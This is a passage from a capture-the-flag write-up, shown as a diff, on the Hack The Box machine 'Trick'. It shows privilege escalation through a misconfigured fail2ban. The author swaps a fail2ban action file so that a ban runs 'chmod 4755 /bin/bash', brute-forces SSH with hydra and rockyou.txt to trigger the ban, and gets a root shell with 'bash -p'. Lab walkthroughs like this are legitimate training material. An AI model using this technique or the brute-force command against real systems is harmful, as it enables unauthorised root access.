@@ -802,5 +802,119 @@ User michael may run the following commands on trick:
 
 <https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7>
 
-Here I found a useful blog post regarding Privilege Escalation abusing `fail2ban`.
+It says that `fail2ban` is designed to take some action based on abnormal behavior to prevent system. However, it can be exploited if it's granting permission to user and if the user can trigger it.
 
+Here I found a useful blog post regarding Privilege Escalation abusing `fail2ban`.
+Before that, let's run `pspy` to monitor the target system.
+
+```bash
+michael@trick:~$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+<SNIP>
+
+2024/11/26 10:30:01 CMD: UID=0     PID=2273   | /usr/sbin/CRON -f 
+2024/11/26 10:30:01 CMD: UID=0     PID=2275   | 
+2024/11/26 10:30:01 CMD: UID=0     PID=2274   | rm -rf /etc/fail2ban/action.d /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.d /etc/fail2ban/filter.d /etc/fail2ban/jail.conf /etc/fail2ban/jail.d /etc/fail2ban/paths-arch.conf /etc/fail2ban/paths-common.conf /etc/fail2ban/paths-debian.conf /etc/fail2ban/paths-opensuse.conf                                                      
+2024/11/26 10:30:01 CMD: UID=0     PID=2276   | cp -r /root/fail2ban /etc/ 
+2024/11/26 10:30:01 CMD: UID=0     PID=2277   | /bin/bash /root/f2b.sh 
+
+```
+
+Based on `pspy` output, fail2ban service restarts regularly.
+Plus, let's check the user permission with `id` command.
+
+ ```bash
+michael@trick:/etc/fail2ban$ id
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+```
+
+The user `michael` belongs to `security` group which is not a normal one. Let me check if there's any file of which group is `security`.
+
+```bash
+michael@trick:/etc/fail2ban$ find / -group security 2>/dev/null
+/etc/fail2ban/action.d
+
+michael@trick:/etc/fail2ban$ ls /etc/fail2ban/action.d
+abuseipdb.conf                       mail.conf
+apf.conf                             mail-whois-common.conf
+badips.conf                          mail-whois.conf
+badips.py                            mail-whois-lines.conf
+blocklist_de.conf                    mynetwatchman.conf
+bsd-ipfw.conf                        netscaler.conf
+cloudflare.conf                      nftables-allports.conf
+complain.conf                        nftables-common.conf
+dshield.conf                         nftables-multiport.conf
+dummy.conf                           nginx-block-map.conf
+firewallcmd-allports.conf            npf.conf
+firewallcmd-common.conf              nsupdate.conf
+firewallcmd-ipset.conf               osx-afctl.conf
+firewallcmd-multiport.conf           osx-ipfw.conf
+firewallcmd-new.conf                 pf.conf
+firewallcmd-rich-logging.conf        route.conf
+firewallcmd-rich-rules.conf          sendmail-buffered.conf
+helpers-common.conf                  sendmail-common.conf
+hostsdeny.conf                       sendmail.conf
+ipfilter.conf                        sendmail-geoip-lines.conf
+ipfw.conf                            sendmail-whois.conf
+iptables-allports.conf               sendmail-whois-ipjailmatches.conf
+iptables-common.conf                 sendmail-whois-ipmatches.conf
+iptables.conf                        sendmail-whois-lines.conf
+iptables-ipset-proto4.conf           sendmail-whois-matches.conf
+iptables-ipset-proto6-allports.conf  shorewall.conf
+iptables-ipset-proto6.conf           shorewall-ipset-proto6.conf
+iptables-multiport.conf              smtp.py
+iptables-multiport-log.conf          symbiosis-blacklist-allports.conf
+iptables-new.conf                    ufw.conf
+iptables-xt_recent-echo.conf         xarf-login-attack.conf
+mail-buffered.conf
+```
+
+Plus, I found an exploit nicely exploiting `iptable` logic in `fail2ban` actions.
+
+<https://github.com/rvizx/fail2ban/blob/main/fail2ban>
+
+Based on its ussage, it's replacing `/etc/fail2ban/action.d/iptables-multiport.conf` in `/etc/fail2ban/action.d`. And `hydra` attack to `ssh` service triggers the `fail2ban` action which is `actionban = chmod 4755 /bin/bash`. So after ban, if the user tries `bash -p`, we can open a root shell.
+
+```bash
+michael@trick:~$ ./fail2ban_privesc.sh 
+
++==============================+
+|  fail2ban-privesc | @rvizx9  |
++==============================+
+
+
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+lo               UNKNOWN        127.0.0.1/8 ::1/128 
+eth0             UP             10.10.11.166/23 dead:beef::250:56ff:fe94:188e/64 fe80::250:56ff:fe94:188e/64                                            
+[!] start to bruteforce ssh login.
+[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh
+[!] bash -p will be executed in 100s
+```
+(Run the exploit script)
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ hydra 10.10.11.166 -l root -P /usr/share/wordlists/rockyou.txt ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-26 04:43:18
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.11.166:22/
+```
+(ssh brute forcing attack from kali to target to trigger fail2ban)
+
+```bash
+michael@trick:~$ ./fail2ban_privesc.sh 
+
+<SNIP>
+
+[!] bash -p will be executed in 100s
+bash-5.0# id
+uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
+
+```
+(Spawned shell)
+
+Now I have a root shell!
